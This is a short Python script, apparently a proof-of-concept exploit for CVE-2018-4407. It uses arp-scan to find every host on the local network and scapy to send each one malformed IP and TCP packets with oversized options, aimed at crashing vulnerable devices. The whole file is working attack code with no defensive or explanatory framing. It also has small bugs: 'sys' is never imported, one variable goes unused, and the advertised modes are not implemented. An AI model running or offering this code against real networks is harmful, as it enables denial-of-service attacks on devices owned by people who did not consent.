from scapy.all import *
import os
try:
    router = sys.argv[2]
    ips_raw = os.popen("arp-scan -I en1 -l | awk '{print $1}'").readlines()
    ips_str = ''.join(str(e) for e in ips_raw)
    ips_array = ips_str.split('\n')
    ips_array.remove('')
    ips_array.remove('Ending')
    ips_array.remove('Interface:')
    ips_array.remove('Starting')
    IPP = ips_array
    for j in IPP:
            for i in range(8,20):
                send(IP(dst=j,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
except Exception as e:
        print ("Usage python CVE-2018-4407.py Mode Router IP")
        print ("Modes: a = Single | b = Fuzzy")